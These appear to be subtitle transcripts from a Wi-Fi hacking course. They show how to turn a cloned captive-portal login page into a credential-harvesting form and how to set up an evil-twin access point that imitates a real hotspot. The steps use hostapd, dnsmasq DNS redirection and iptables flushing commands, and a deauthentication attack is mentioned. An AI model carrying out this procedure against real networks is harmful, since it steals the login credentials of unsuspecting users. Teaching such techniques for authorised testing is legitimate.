00:02:40,030 --> 00:02:43,720
so it needs to be placed before this input right here.

39
00:02:44,200 --> 00:02:47,770
So to look for the input, we're going to look for an input tag.

40
00:02:47,770 --> 00:02:50,860
So I'm just going to put input in here.

41
00:02:54,540 --> 00:02:56,490
And I'm just going to zoom in a little bit.

42
00:02:56,490 --> 00:03:00,510
And as you can see, we have you can see that we have a username here.

43
00:03:00,510 --> 00:03:02,400
I'm just going to hit enter to bring it down.

44
00:03:02,400 --> 00:03:04,140
So we have the username.

45
00:03:04,140 --> 00:03:06,030
This is what's being displayed on screen.

46
00:03:06,030 --> 00:03:11,700
And then we have the input, which is basically the text box that the people enter their username that's

47
00:03:11,700 --> 00:03:12,480
in here.

48
00:03:13,490 --> 00:03:16,320
Now we also need to look for the password input.

49
00:03:16,340 --> 00:03:22,810
So again, I'm just going to click on next to go to find the next input in the in the text.

50
00:03:22,820 --> 00:03:25,010
And as you can see, we see the password here.

51
00:03:25,010 --> 00:03:28,970
So this is literally the password, the text that you see on the page.

52
00:03:28,970 --> 00:03:32,480
And then it's followed by the input tag right here.

53
00:03:33,950 --> 00:03:38,300
Now, again, this is the text box where users enter their password.

54
00:03:39,170 --> 00:03:41,120
The last thing that we want to look for.

55
00:03:41,120 --> 00:03:43,670
So we already have the username, we have the password.

56
00:03:43,670 --> 00:03:47,450
The last thing that we want to look for is this button, the login button.

57
00:03:48,950 --> 00:03:53,280
So again, I'm going to put my mouse here before the input, the password input.

58
00:03:53,300 --> 00:03:55,700
I'm going to do I'm going to type in here.

59
00:03:56,240 --> 00:03:57,110
Login.

60
00:04:00,880 --> 00:04:06,640
And again, as you can see, we have the login text that that's the users are seeing here.

61
00:04:06,790 --> 00:04:10,810
And notice in here that they're actually not using a login button.

62
00:04:10,810 --> 00:04:12,910
This is literally just a text.

63
00:04:12,910 --> 00:04:19,240
And if you analyze the HTML more, you'll see that that they're submitting the form using JavaScript

64
00:04:19,240 --> 00:04:21,730
and I'm going to modify that in a minute as well.

65
00:04:22,330 --> 00:04:25,720
So I'm just going to bring this down so it's easier for us to see.

66
00:04:25,960 --> 00:04:30,220
And as you can see, this is the login, this is the end of it.

67
00:04:30,220 --> 00:04:34,690
Usually when you see forward slash something means this is the end of that tag.

68
00:04:34,900 --> 00:04:37,540
So this is the end of the login that we see.

69
00:04:37,540 --> 00:04:41,140
This is the login of a container that contains the login.

70
00:04:41,140 --> 00:04:43,330
And this is just more code in here.

71
00:04:43,330 --> 00:04:48,040
So I'm just going to hit a number of new lines just so that we have our code separated.

72
00:04:50,060 --> 00:04:54,080
So the code that we're interested in is right here.

73
00:04:54,200 --> 00:05:03,020
And as you can see, this consists of the username text, the username, input the password, text the

74
00:05:03,020 --> 00:05:04,670
password input.

75
00:05:04,910 --> 00:05:11,570
And as you can see at the end, we have the login that the user is press to literally log in and submit

76
00:05:11,570 --> 00:05:13,010
the username and the password.

77
00:05:14,160 --> 00:05:20,490
So the whole idea, the whole thing, the whole reason why I'm doing this, the inputs in here are not

78
00:05:20,490 --> 00:05:23,400
wrapped in a form tag, and this is what I'm going to do.

79
00:05:23,400 --> 00:05:25,620
So I'm going to manually add form.

80
00:05:27,090 --> 00:05:33,690
I'm going to specify the method that the data will be sent and we're going to send this using post.

81
00:05:36,050 --> 00:05:41,000
This will make it easy for us to see it in Wireshark or in any sniffer later on.

82
00:05:41,210 --> 00:05:46,670
And the action this is basically the Web page that the data should be sent to.

83
00:05:46,700 --> 00:05:51,920
Usually if you're actually programming a web application, you want this to be sent to a program that

84
00:05:51,920 --> 00:05:54,790
will analyze the username and password and validate them.

85
00:05:54,800 --> 00:05:57,020
But in my case, I don't care where it goes.

86
00:05:57,020 --> 00:06:03,230
All I want is I want this data to be sent over post so I can sniff it using my sniffer.

87
00:06:03,350 --> 00:06:09,770
So I'm literally just going to send it back to the same web page that we're in, which is index.html.

88
00:06:10,130 --> 00:06:14,870
So I'm going to put a forward slash index dot HTML.

89
00:06:16,190 --> 00:06:17,410
And we're done.

90
00:06:17,420 --> 00:06:22,550
And as you can see now, when I close the tag, it automatically added this for me.

91
00:06:22,580 --> 00:06:26,690
This is again, like I said, this is the close of the tag.

92
00:06:26,690 --> 00:06:28,420
So this is the end of the tag.

93
00:06:28,430 --> 00:06:33,440
That's the way HTML is For every open tag, it should be closed at the end.

94
00:06:34,220 --> 00:06:40,070
So what I'm going to do, I'm just going to copy this or cut it and I'm just going to put it after my

95
00:06:40,070 --> 00:06:40,400
input.

96
00:06:40,400 --> 00:06:46,970
So I have my login input in here and I'm just going to put that here at the end, literally after that.

97
00:06:48,030 --> 00:06:50,040
So I'm just going to make this prettier.

98
00:06:50,070 --> 00:06:52,380
Put that in here just so that you get the idea.

99
00:06:53,910 --> 00:06:55,780
And I'm just going to go over this again.

100
00:06:55,800 --> 00:07:03,870
So we already had all this code in here in the web page, and all I wanted to do is I wanted the data

101
00:07:03,870 --> 00:07:12,750
inputted in the username and in the password text boxes to be sent over http using post so that I can

102
00:07:12,750 --> 00:07:16,350
sniff it easily and see it easily when I sniff the data.

103
00:07:16,590 --> 00:07:17,490
So I did.

104
00:07:17,490 --> 00:07:18,870
I added a form here.

105
00:07:18,870 --> 00:07:25,500
I set the method to post and I set the action to be sent to the same web page that we're in right now.

106
00:07:25,920 --> 00:07:29,070
And then at the end we close the form tag.

107
00:07:30,390 --> 00:07:31,890
Now one more time.

108
00:07:31,890 --> 00:07:38,130
If your web page already had the inputs wrapped in form in a form tag, then you don't need to do this.

109
00:07:38,130 --> 00:07:42,930
I'm only doing this because of the way that my target web page was programmed.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,360 --> 00:00:06,120
Now, one last thing that we need to pay attention to is the login now.

2
00:00:06,150 --> 00:00:12,960
Ideally, you want the login to be another input and it literally just submits this form that we created.

3
00:00:13,320 --> 00:00:18,670
Now, again, in my web page, in my example, they're using JavaScript to submit the code.

4
00:00:18,690 --> 00:00:24,450
So what I'm going to do is I'm going to delete all of this because this is the login button that they're

5
00:00:24,450 --> 00:00:26,310
showing in here, and it's actually not a button.

6
00:00:26,310 --> 00:00:28,830
It's literally just a container that says login.

7
00:00:28,830 --> 00:00:31,380
And then they're using JavaScript to submit this.

8
00:00:31,380 --> 00:00:34,500
So I don't want this, I want a proper HTML button.

9
00:00:34,500 --> 00:00:38,760
So this is the span, this is the code that's responsible for it.

10
00:00:38,760 --> 00:00:46,410
And again, if you're confused, you can just come on this page, right click this inspect element and

11
00:00:46,410 --> 00:00:47,670
it'll highlight it for you.

12
00:00:47,700 --> 00:00:50,370
You'll see that this is inside a div.

13
00:00:51,110 --> 00:00:57,350
And inside that div we have this span login as as you can see, it actually highlights it for us.

14
00:00:58,100 --> 00:01:00,770
So I'm going to delete that login.

15
00:01:01,460 --> 00:01:05,720
I already have it in here, so we're just going to mark it.

16
00:01:08,160 --> 00:01:08,850
Delete it.

17
00:01:08,850 --> 00:01:09,930
That's gone now.

18
00:01:10,290 --> 00:01:12,240
Then I'm going to add my input.

19
00:01:14,020 --> 00:01:22,360
That I'm going to use to submit the form and I'm just going to do input and set the type, which is

20
00:01:22,360 --> 00:01:24,130
going to be submit.

21
00:01:26,680 --> 00:01:29,470
And then I'm going to set the value.

22
00:01:29,920 --> 00:01:31,720
This is what the user see.

23
00:01:31,720 --> 00:01:34,990
This is literally the text displayed inside the button.

24
00:01:35,140 --> 00:01:37,600
And for me, I'm just going to call it login.

25
00:01:39,420 --> 00:01:44,120
Because they called their login button login and that's it.

26
00:01:44,130 --> 00:01:45,930
So I literally just deleted.

27
00:01:45,930 --> 00:01:48,690
We'll just go back to their web page to see what we did.

28
00:01:48,720 --> 00:01:55,200
We literally just deleted this login text right here and we added a proper HTML input to it.

29
00:01:56,290 --> 00:02:04,450
Now, we also have this dev right here, which is a container, and if you notice all the styles.

30
00:02:04,450 --> 00:02:10,950
So the yellow color in here and the size of the container and all of that is set inside this dev.

31
00:02:10,960 --> 00:02:14,920
So when I, when I highlight this, you'll see the whole dev gets highlighted.

32
00:02:14,920 --> 00:02:19,300
But when I highlight the span, you'll see only the text gets highlighted.

33
00:02:19,540 --> 00:02:24,880
So we actually want the style that's being used in here and we don't need this dev.

34
00:02:25,060 --> 00:02:29,230
So before I delete the dev I'm going to copy its style.

35
00:02:29,380 --> 00:02:35,710
And if we, if you notice in here, you see we have a style tag which is responsible for styling this

36
00:02:35,710 --> 00:02:36,220
div.

37
00:02:36,920 --> 00:02:38,990
So I'm going to right click this tag.

38
00:02:39,530 --> 00:02:42,320
I'm going to click on edit as HTML.

39
00:02:43,310 --> 00:02:49,100
And there is no point of editing it in here because it will actually anything you modify will be gone

40
00:02:49,100 --> 00:02:50,100
once you refresh.

41
00:02:50,120 --> 00:02:54,040
So why I'm doing this is just so that I can copy this style.

42
00:02:54,050 --> 00:02:58,400
So I'm just navigating down and this is this tile that I want.

43
00:03:00,320 --> 00:03:07,610
It's actually in here and I'm just going to copy all of this so that my button will look exactly like

44
00:03:07,610 --> 00:03:09,410
this div after I delete it.

45
00:03:10,550 --> 00:03:13,250
So I'm just going to do control C to copy.

46
00:03:14,090 --> 00:03:16,700
I'm going to come back to my document here.

47
00:03:17,240 --> 00:03:21,110
I'm going to delete this whole div until I find it.

48
00:03:21,110 --> 00:03:26,000
So this is the closing of it and the start of it should be before that.

49
00:03:26,000 --> 00:03:28,520
So if I just look for dev for div.

50
00:03:29,680 --> 00:03:31,690
And go previous this time.

51
00:03:32,700 --> 00:03:34,200
You'll see it in here.

52
00:03:34,920 --> 00:03:36,540
I'm just going to go down so you see it.

53
00:03:36,540 --> 00:03:41,430
So this is the div that we want to get rid of and it has the style that I like that's going to make

54
00:03:41,430 --> 00:03:43,860
my button look like the button that they're using.

55
00:03:44,070 --> 00:03:46,140
So first of all, I'm going to delete it.

56
00:03:51,030 --> 00:03:53,280
And then I'm going to add the style in here.

57
00:03:53,280 --> 00:03:55,830
So it's going to do style.

58
00:04:00,380 --> 00:04:03,260
And put everything between quotations.

59
00:04:03,920 --> 00:04:07,760
Save it and let's go and refresh the page.

60
00:04:07,790 --> 00:04:08,840
See what it looks like.

61
00:04:13,210 --> 00:04:18,970
So if we click on login, you can see the page still looks very similar.

62
00:04:18,970 --> 00:04:24,220
We still have our inputs in here and this is now is a login button.

63
00:04:24,220 --> 00:04:27,580
And notice that the font in here is a little bit different.

64
00:04:27,580 --> 00:04:31,990
So it used to be white, now it's black and it's slightly smaller.

65
00:04:32,140 --> 00:04:39,040
Now if you want to achieve a perfect result, you can easily add a few properties to the style tag.

66
00:04:39,250 --> 00:04:45,220
I don't want to get into too much details about CSS and all that because it's going to get a bit confusing,

67
00:04:45,220 --> 00:04:48,910
but I think the page is very convincing right now.

68
00:04:49,240 --> 00:04:54,760
Now I'm just going to do it quickly just to show you that you can literally mimic anything you want

69
00:04:54,790 --> 00:04:57,610
with some knowledge of CSS and styling.

70
00:04:57,880 --> 00:05:01,360
So we have the style in here.

71
00:05:01,360 --> 00:05:03,490
All we have to do is just do color.

72
00:05:06,270 --> 00:05:07,230
White.

73
00:05:08,570 --> 00:05:10,430
And save it.

74
00:05:10,790 --> 00:05:17,450
If you come here and refresh, you'll see the color is going to go to white and so on.

75
00:05:17,450 --> 00:05:22,790
So again, I don't want to dive too deep into CSS and HTML.

76
00:05:22,820 --> 00:05:28,910
I think I've already spent too much time on it, but I think this way we covered everything that might

77
00:05:28,910 --> 00:05:29,600
face you.

78
00:05:29,630 --> 00:05:37,100
Usually in most of the situations that you'll face, you'll probably won't need to modify the URLs or

79
00:05:37,100 --> 00:05:39,530
modify the inputs and wrap them in form.

80
00:05:39,530 --> 00:05:45,170
I only did this because the website that I'm trying to clone is actually programmed like that.

81
00:05:46,400 --> 00:05:51,770
If you're really stuck at this point and you just didn't know how to modify HTML, you can just use

82
00:05:51,770 --> 00:05:55,580
a generic login web page and I'll include this later on in the course.

83
00:05:57,550 --> 00:06:05,950
But if you just go back over this lecture, I know it might be I covered a few new kind of ideas and

84
00:06:05,950 --> 00:06:08,720
topics in it, but what I did is very simple.

85
00:06:08,740 --> 00:06:12,550
Basically, you want to look for the input tags, make sure that wrapped.

86
00:06:12,550 --> 00:06:16,690
They are wrapped in a form tag which looks like this and like this one.

87
00:06:16,690 --> 00:06:19,210
If they're already wrapped in form tags.

88
00:06:19,210 --> 00:06:19,840
Perfect.

89
00:06:19,870 --> 00:06:22,420
Leave it and just continue with the next lecture.

90
00:06:22,420 --> 00:06:23,450
If they're not.

91
00:06:23,470 --> 00:06:26,200
Just sort them out the same way I did here.

92
00:06:26,200 --> 00:06:27,460
Put the form tag.

93
00:06:27,460 --> 00:06:30,880
So put a form here and the form with the forward slash form.

94
00:06:30,880 --> 00:06:35,590
And then if there is no input button, then put the input button yourself and that's it.

95
00:06:35,620 --> 00:06:43,480
We're good to go and we'll continue with creating our evil or fake access point in the next lecture.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,990 --> 00:00:08,190
Okay, now that we have our website cloned, modified and stored in our web server, we're ready to

2
00:00:08,190 --> 00:00:12,810
go to the next step, which is creating our fake access point.

3
00:00:13,660 --> 00:00:17,050
Now I've covered creating fake access points before.

4
00:00:17,050 --> 00:00:23,050
I covered how to do that manually using air base engine, and I covered how to do that using a script

5
00:00:23,050 --> 00:00:24,820
that's called Manna Toolkit.

6
00:00:25,210 --> 00:00:31,030
Both of these methods are good, but what I want to show you today is a generic method.

7
00:00:31,030 --> 00:00:36,790
That's first of all, it's a manual method that's, first of all, faster than air base engine.

8
00:00:37,330 --> 00:00:42,990
And it's also what Manna Toolkit uses to generate its fake access point.

9
00:00:43,000 --> 00:00:50,110
So Manna, flexion, Wi-Fi, Fisher And all these scripts rely on the method that I'm going to show

10
00:00:50,110 --> 00:00:53,500
you today to create their fake access points.

11
00:00:53,920 --> 00:00:59,980
The reason why I'm kind of going low level on this is because, first of all, I want you to understand

12
00:00:59,980 --> 00:01:06,910
how a wireless access point works and how to manually generate one so that in the future, if any of

13
00:01:06,910 --> 00:01:14,180
these tools broke and just didn't work, or if you had a certain scenario or if you were just in a certain

14
00:01:14,180 --> 00:01:20,360
position where you had to kind of customize your attack, then you'll know how to do that yourself without

15
00:01:20,360 --> 00:01:22,160
being limited to these tools.

16
00:01:23,380 --> 00:01:29,560
So before we do anything, I just want to give you an overview, a simplified version of the components

17
00:01:29,560 --> 00:01:31,360
used in an access point.

18
00:01:31,840 --> 00:01:38,020
So first of all, you need a wireless device that will broadcast a signal that's going to broadcast

19
00:01:38,050 --> 00:01:39,220
a Wi-Fi signal.

20
00:01:39,400 --> 00:01:44,710
Now we have a wireless interface that's going to do that for us, and we're going to use a program called

21
00:01:44,710 --> 00:01:45,910
Hostapd.

22
00:01:46,900 --> 00:01:50,800
Now, like I said, this is the program that's used by Manna Toolkit.

23
00:01:50,800 --> 00:01:56,320
So literally, Manna Toolkit runs this program in the background to give you to broadcast the access

24
00:01:56,320 --> 00:01:59,920
point that it generates on on all these other tools.

25
00:01:59,920 --> 00:02:03,690
Also use Hostapd to create their access point.

26
00:02:03,700 --> 00:02:09,280
So we're basically removing a layer and we're literally going down a layer two and we're going to be

27
00:02:09,280 --> 00:02:12,760
doing this manually ourselves through the command prompt.

28
00:02:14,090 --> 00:02:20,870
Then you'll also need a server that will give IP addresses to the clients that connect to our fake access

29
00:02:20,870 --> 00:02:21,500
point.

30
00:02:22,010 --> 00:02:27,110
Now you can use a normal Dhcp server or you can use DNS mask.

31
00:02:27,740 --> 00:02:36,080
I like to use DNS mask because it's a 2 in 1 server because we can actually also use it as a DNS server

32
00:02:36,080 --> 00:02:38,000
to handle the requests.

33
00:02:38,000 --> 00:02:44,570
And in our particular example, it's going to be very useful because we're going to use it to redirect

34
00:02:44,570 --> 00:02:51,710
any requests that go to any website and redirect them to our login page, because we want this to work

35
00:02:51,710 --> 00:02:58,430
as a captive portal so that if people try to go to any website, they'll end up in our login page instead

36
00:02:58,430 --> 00:03:00,830
of actually giving them the website that they want.

37
00:03:01,670 --> 00:03:04,000
So we have three main components.

38
00:03:04,010 --> 00:03:08,560
We have a host that's going to generate our wireless network.

39
00:03:08,570 --> 00:03:14,810
We have a Dhcp server that's going to give IPS to the people that connect to this network and we have

40
00:03:14,810 --> 00:03:18,320
a DNS server that's going to resolve DNS requests.

41
00:03:18,320 --> 00:03:24,740
And in our example we're going to make it redirect any request to the IP where our fake login page is

42
00:03:24,740 --> 00:03:27,170
installed and that's usually our own IP.

43
00:03:28,780 --> 00:03:33,400
Now let me do this manually and it will become more clear to you.

44
00:03:33,910 --> 00:03:42,120
So I have my Kali machine here and the first thing that I'm going to do is install DNS mask and hostapd.

45
00:03:42,580 --> 00:03:44,590
So I'm going to go on my terminal.

46
00:03:46,280 --> 00:03:48,320
And I'm just going to do apt get.

47
00:03:49,870 --> 00:03:50,830
Host APD.

48
00:03:52,220 --> 00:03:53,360
DNS mask.

49
00:03:55,030 --> 00:03:58,240
So we've used this command so many times by now.

50
00:03:58,240 --> 00:04:04,540
All we have to do is just do apt get install the programs that we want to install and we're installing

51
00:04:04,540 --> 00:04:09,730
host APT, which is the program that's going to generate the wireless network and the Dnsmasq, which

52
00:04:09,730 --> 00:04:13,750
is our DNS server and Dhcp server.

53
00:04:13,900 --> 00:04:18,940
I'm going to hit Enter and for me they're both already installed, so it's not going to install anything

54
00:04:18,940 --> 00:04:22,650
for me, but for you it's going to ask you, do you actually want to install it?

55
00:04:22,660 --> 00:04:24,160
You're going to have to type Y.

56
00:04:24,190 --> 00:04:26,620
Hit enter and it'll install it for you.

57
00:04:27,340 --> 00:04:33,250
Once done with that, I'm going to connect my wireless adapter through my USB port.

58
00:04:34,480 --> 00:04:36,220
I'm going to go to devices.

59
00:04:37,290 --> 00:04:40,820
USB and make sure that the adapter is selected.

60
00:04:40,820 --> 00:04:43,040
And as you can see, mine is already selected.

61
00:04:43,340 --> 00:04:46,280
So if I do ifconfig, it should be there now.

62
00:04:48,020 --> 00:04:52,310
As you can see, I have learnt zero already there, so we're good to go.

63
00:04:53,090 --> 00:04:57,080
Now the first step is going to be disabling network manager.

64
00:04:57,290 --> 00:05:05,030
The reason why I do this because it usually manages this interface and it will prevent it from working

65
00:05:05,030 --> 00:05:09,680
properly and it will prevent it from being used to broadcast a WiFi signal.

66
00:05:10,070 --> 00:05:11,810
So we're going to do service.

67
00:05:12,110 --> 00:05:15,290
Network Manager Stop.

68
00:05:17,310 --> 00:05:18,450
And that's done.

69
00:05:18,660 --> 00:05:22,380
Notice the network icon disappears from here, from the top.

70
00:05:23,280 --> 00:05:26,910
Now, the next step is actually not a mandatory step.

71
00:05:26,910 --> 00:05:28,170
It's an optional one.

72
00:05:28,170 --> 00:05:33,750
But I like to do it every time I run something like this or try to become the man in the middle.

73
00:05:33,780 --> 00:05:39,480
The reason why, because I'm going to run a number of commands that's going to enable IP forwarding

74
00:05:39,480 --> 00:05:43,620
so that the packets can flow through my computer without being dropped.

75
00:05:43,620 --> 00:05:50,100
And it will also delete any IP tables rules that might interfere with what I'm trying to do.

76
00:05:50,100 --> 00:05:56,790
So it's going to flush IP tables, remove any redirections, any chains that might interfere with packets,

77
00:05:56,790 --> 00:06:00,270
that might be redirecting packets to places that they shouldn't go.

78
00:06:00,270 --> 00:06:07,830
So it's literally clearing any firewall rules that might be redirecting packets to somewhere else.

79
00:06:07,860 --> 00:06:12,060
Now, by default, you shouldn't need to do this because there shouldn't be any rules at all.

80
00:06:12,090 --> 00:06:13,620
But you never know.

81
00:06:13,620 --> 00:06:18,160
When programs modify and add IP table rules in the background.

82
00:06:18,160 --> 00:06:20,470
So to be safe, we're going to do that.

83
00:06:20,470 --> 00:06:26,980
And I usually store this in a file in a bash script so I can just run it from terminal, just do bash

84
00:06:26,980 --> 00:06:28,960
and type in the name of the script.

85
00:06:28,960 --> 00:06:34,300
But for now, I'm actually just for the sake of completion, I'm going to open it with a text editor

86
00:06:34,870 --> 00:06:37,420
and I'm just going to copy all the commands here.

87
00:06:37,420 --> 00:06:43,420
So you can see the first command just enables IP forwarding the second command, it will just flush,

88
00:06:43,450 --> 00:06:51,070
IP tables will flush the Nat table, will delete chains and will enable forwarding in IP tables.

89
00:06:51,770 --> 00:06:53,540
So again, this is optional.

90
00:06:53,540 --> 00:06:59,070
It's not mandatory, but it's better to do it to make sure that your tables is clear.

91
00:06:59,090 --> 00:07:03,440
There's nothing that's going to interfere with our attack and that it's going to work.

92
00:07:03,440 --> 00:07:07,250
And so that if it fails, we'll know it's it's nothing to do with IP tables.

93
00:07:07,700 --> 00:07:09,500
So I'm just going to paste everything here.

94
00:07:09,500 --> 00:07:11,480
You can actually paste multi lines.

95
00:07:11,480 --> 00:07:17,630
And as you can see, all of them get executed without showing any errors, which means that all of them

96
00:07:17,630 --> 00:07:19,310
got executed successfully.

97
00:07:20,200 --> 00:07:25,000
Now, so far we actually haven't done anything to generate our fake access point.

98
00:07:25,030 --> 00:07:27,130
We said we have two, three main components.

99
00:07:27,130 --> 00:07:30,940
First start fake access point using hostapd.

100
00:07:31,180 --> 00:07:35,210
Second, start the Dhcp server and third started DNS server.

101
00:07:35,230 --> 00:07:36,360
We haven't done any of that.

102
00:07:36,370 --> 00:07:42,100
We just stopped our wireless adapter and then we deleted any rules that might interfere with our attack.

103
00:07:42,460 --> 00:07:48,460
Now in the next lecture I'll show you how to properly configure all of these services, start them so

104
00:07:48,460 --> 00:07:54,550
we have a fully functioning fake access point that people can connect to and use just like a normal

105
00:07:54,550 --> 00:07:55,540
access point.

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,750 --> 00:00:01,230
Right.

2
00:00:01,230 --> 00:00:02,790
So now we prepared our system.

3
00:00:02,790 --> 00:00:08,370
We installed DNS Mask and Hostapd and we connected our wireless adapter.

4
00:00:08,370 --> 00:00:14,820
We stopped the network manager, We cleared any rules that might that might interfere with creating

5
00:00:14,820 --> 00:00:16,250
a fake access point.

6
00:00:16,260 --> 00:00:22,230
In this lecture, I'm going to show you how to configure DNS mask so we can use it as a DNS server and

7
00:00:22,230 --> 00:00:23,700
a Dhcp server.

8
00:00:23,700 --> 00:00:29,760
And I'm going to show you how to configure Hostapd so we can start the fake access point and allow people

9
00:00:29,760 --> 00:00:30,810
to connect to it.

10
00:00:31,020 --> 00:00:39,660
Now let's go to the first step and let's try to start our Dhcp server and that's also going to act as

11
00:00:39,660 --> 00:00:41,310
our DNS server.

12
00:00:41,310 --> 00:00:46,290
Like I said, because we're using DNS mask which can be used to handle both tasks.

13
00:00:46,860 --> 00:00:50,880
So to use the mask you need a configuration file.

14
00:00:51,060 --> 00:00:55,920
I'm going to include this in the resources, but before I just run it, I actually want to explain to

15
00:00:55,920 --> 00:00:58,110
you what's inside it because it's very simple.

16
00:00:58,110 --> 00:01:03,550
And like I said, I want you to understand what's going inside these configuration files so that you

17
00:01:03,550 --> 00:01:06,130
can adapt it to your own scenario.

18
00:01:06,580 --> 00:01:11,710
So I'm going to right click this and I'm just going to open it with Genie so I can zoom in.

19
00:01:12,160 --> 00:01:16,030
It's it's a normal text, so you can open it with any text editor.

20
00:01:16,420 --> 00:01:21,910
And I've added comments here to tell you what each of these lines does.

21
00:01:22,180 --> 00:01:25,900
So anything that's preceded with the hash tag here means it's a comment.

22
00:01:25,900 --> 00:01:28,090
It's not going to be read by the program.

23
00:01:28,090 --> 00:01:32,020
It's just some it's just a way for me to tell you what's this going to do?

24
00:01:33,240 --> 00:01:36,990
So you can see the first line here sets the interface.

25
00:01:36,990 --> 00:01:38,940
So I have that set to line zero.

26
00:01:38,970 --> 00:01:40,770
That's the name of my interface in here.

27
00:01:40,770 --> 00:01:43,710
As you can see, that's the name of my wireless interface.

28
00:01:48,370 --> 00:01:56,050
Then we set the range that we can give to our clients and you can see that set from ten zero zero,

29
00:01:56,050 --> 00:01:58,690
10 to 10 zero zero 100.

30
00:01:58,930 --> 00:02:02,860
And each of these IPS can last for eight hours.

31
00:02:03,580 --> 00:02:06,790
Then we set the IP of the gateway.

32
00:02:06,790 --> 00:02:12,310
So that's going to be the IP of my LAN zero after I start the fake access point.

33
00:02:12,310 --> 00:02:15,070
And that's going to be set to ten 001.

34
00:02:15,520 --> 00:02:20,740
And as you might know, we usually use the first IP for the gateway or for the router.

35
00:02:21,750 --> 00:02:30,070
Then we set the IP for the DNS server and again, that sent to ten 001, which is the IP of my computer.

36
00:02:30,090 --> 00:02:33,240
The IP of the router in this fake access point.

37
00:02:34,110 --> 00:02:41,760
The last line here is very important and this will redirect any request that anyone makes on this fake

38
00:02:41,760 --> 00:02:46,570
access point to the IP of the router to ten 001.

39
00:02:46,590 --> 00:02:52,590
So we're redirecting we're using the hashtag here, which means that we're redirecting any requests

40
00:02:52,590 --> 00:02:56,340
to any web page to the IP of my computer.

41
00:02:56,820 --> 00:03:02,610
Now, if you look at the result of ifconfig right now, you'll see that I still don't have an IP address,

42
00:03:02,610 --> 00:03:07,800
but once I start the network, I'm going to configure it to have an IP of ten 001.

43
00:03:08,900 --> 00:03:16,190
Now, this is very similar to doing a DNS spoofing attack, but instead of using another tool to do

44
00:03:16,190 --> 00:03:21,470
that, we can just do it through the DNS server right here because we're going to be already the man

45
00:03:21,470 --> 00:03:26,990
in the middle because we're already the people that's broadcasting the signal, that's making the access

46
00:03:26,990 --> 00:03:27,650
point.

47
00:03:29,790 --> 00:03:34,020
So I'm going to close it and I'm going to start the mask.

48
00:03:34,050 --> 00:03:37,080
So first in here, I'm just going to clear this.

49
00:03:38,830 --> 00:03:41,380
And then I'm going to do DNS mask.

50
00:03:42,630 --> 00:03:50,190
And then I'm going to do Dash C to specify the location where I have my configuration file.

51
00:03:50,280 --> 00:03:55,770
And as you can see in here, my configuration file is in home downloads, fake AP.

52
00:03:55,980 --> 00:04:04,980
So it's going to be root because in Kali home is set to root and it's downloads fake AP and the name

53
00:04:04,980 --> 00:04:07,870
of my file is called DNS conf.

54
00:04:08,620 --> 00:04:11,050
So we're doing the dnsmasq.

55
00:04:11,110 --> 00:04:15,700
D'ye see the location where we have our configuration file?

56
00:04:17,680 --> 00:04:18,100
Okay.

57
00:04:18,100 --> 00:04:20,180
Now that got executed with no errors.

58
00:04:20,200 --> 00:04:27,190
This means that now we have a DNS server and a Dhcp server running in the background as a service.

59
00:04:27,520 --> 00:04:35,260
So if we go back to our slide in here, we can see that we have steps two and three already done and

60
00:04:35,260 --> 00:04:41,350
all we have to do now is just create a fake access point that's going to broadcast our signal.

61
00:04:41,860 --> 00:04:49,240
So let's go back to the Kali machine and before we start our fake access point, I want to show you

62
00:04:49,240 --> 00:04:51,540
the configuration file that it uses.

63
00:04:51,550 --> 00:04:55,650
So just like the Dnsmasq, it uses a configuration file.

64
00:04:55,690 --> 00:04:57,610
So I'm just going to right click it in here.

65
00:04:57,610 --> 00:05:03,190
Again, I'm going to include it in the resources and I'm going to open it in Genie so I can zoom in.

66
00:05:03,490 --> 00:05:08,560
And as you can see in here, it's a very simple file, has just a few lines.

67
00:05:08,560 --> 00:05:11,830
I have the comments here to tell you what each of these lines does.

68
00:05:11,920 --> 00:05:15,640
And you can see now the first line is the interface that we're using.

69
00:05:15,640 --> 00:05:19,520
And again, I'm setting it to lan zero because that's the name of my wireless adapter.

70
00:05:20,330 --> 00:05:24,260
The second line sets the name of the network.

71
00:05:24,260 --> 00:05:30,080
So you want to set this to a name that's similar to the network that you're targeting.

72
00:05:30,080 --> 00:05:34,970
If you're targeting a captive portal or you need to set it to the same name.

73
00:05:34,970 --> 00:05:39,590
If you're trying to target a normal network with a WPA encryption.

74
00:05:39,800 --> 00:05:42,650
So in my case, I'm doing this against a captive portal.

75
00:05:42,650 --> 00:05:45,710
And the name of the captive portal was Royal Wi-Fi.

76
00:05:45,740 --> 00:05:51,860
So I'm going to set this to the same name and I'm just going to call it version two so that when people

77
00:05:51,860 --> 00:05:58,730
get disconnected from the proper royal Wi-Fi because we're going to do a authentication attack, they'll

78
00:05:58,730 --> 00:06:03,140
think that there's something wrong with that network, and then they'll try to connect to this one thinking

79
00:06:03,140 --> 00:06:05,030
this is an updated version of it.

80
00:06:06,560 --> 00:06:08,240
Okay, now I'm going to save this.

81
00:06:08,990 --> 00:06:13,160
The next line sets the channel that this network will be broadcasting on.

82
00:06:13,160 --> 00:06:14,690
I'm going to leave it at one.

83
00:06:14,810 --> 00:06:19,250
And the last line says the driver to be used for the interface adapter.

84
00:06:19,250 --> 00:06:20,600
And I'm going to leave it.

85
00:06:21,360 --> 00:06:23,160
Now everything is done again.

86
00:06:23,160 --> 00:06:29,160
I'm going to close this and I'm going to start the host network by doing host APD.

87
00:06:30,850 --> 00:06:33,820
Followed by the name of the configuration file.

88
00:06:33,820 --> 00:06:37,000
So it's stored in root downloads.

89
00:06:38,170 --> 00:06:42,550
Fake AP, and it's called host AP Dconf.

90
00:06:44,090 --> 00:06:49,250
And I'm also going to add Dash B to the end, because usually when you run this command without the

91
00:06:49,250 --> 00:06:56,540
dash B, it'll run as a command in the foreground and you'll have to open a new terminal window to run

92
00:06:56,540 --> 00:06:57,440
commands from.

93
00:06:57,440 --> 00:07:03,890
So I'm doing dash B at the end so that if I hit enter it'll be executed at the background and then I'll

94
00:07:03,890 --> 00:07:06,050
be able to run more commands in the terminal.

95
00:07:07,070 --> 00:07:13,130
Now, as you can see, it's telling us that the network is working and it's broadcasting under the name

96
00:07:13,130 --> 00:07:15,380
Royal WiFi version two.

97
00:07:16,560 --> 00:07:23,880
